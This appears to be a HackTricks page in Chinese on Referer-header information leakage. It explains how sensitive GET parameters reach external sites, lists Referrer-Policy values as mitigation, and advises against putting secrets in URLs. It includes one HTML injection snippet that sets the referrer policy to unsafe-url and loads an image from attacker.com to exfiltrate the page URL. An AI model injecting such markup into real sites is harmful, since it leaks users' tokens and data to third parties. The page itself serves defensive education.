{{#include ../banners/hacktricks-training.md}}

# 引荐头和策略

引荐是浏览器用来指示上一个访问页面的头部。

## 敏感信息泄露

如果在网页的某个地方，任何敏感信息位于GET请求参数中，如果页面包含指向外部源的链接，或者攻击者能够使/建议（社会工程学）用户访问由攻击者控制的URL。它可能能够提取最新GET请求中的敏感信息。

## 缓解措施

您可以让浏览器遵循一个**Referrer-policy**，以**避免**将敏感信息发送到其他Web应用程序：
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## 反制措施

您可以使用 HTML meta 标签覆盖此规则（攻击者需要利用 HTML 注入）：
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 防御

永远不要将任何敏感数据放入GET参数或URL中的路径。 

{{#include ../banners/hacktricks-training.md}}
